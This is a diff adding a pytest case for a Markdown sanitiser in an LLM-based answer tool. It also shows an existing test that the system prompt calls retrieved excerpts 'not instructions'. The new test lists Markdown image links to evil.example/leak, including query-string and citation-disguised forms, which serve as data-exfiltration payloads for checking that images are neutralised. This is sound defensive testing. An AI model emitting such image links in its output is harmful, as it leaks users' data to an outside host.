@@ -238,3 +238,19 @@ def test_passage_text_cannot_close_its_excerpt_or_pose_as_the_question():
 
 def test_system_prompt_says_excerpts_are_not_instructions():
     assert "not instructions" in SYSTEM_PROMPT
+
+
+@pytest.mark.parametrize(
+    "image",
+    [
+        "![logo](https://evil.example/leak?q=secret)",
+        "![logo][ref]\n\n[ref]: https://evil.example/leak",
+        "![ref]\n\n[ref]: https://evil.example/leak",
+        "Text![a](https://evil.example/a)![b](https://evil.example/b)",
+        "Made from a citation: !【S1】\n\n[S1]: https://evil.example/leak",
+    ],
+)
+def test_tidy_markdown_turns_images_into_plain_text(image: str):
+    tidy = tidy_markdown(image)
+    assert "![" not in tidy
+    assert tidy.count("!\\[") == max(image.count("!["), 1)
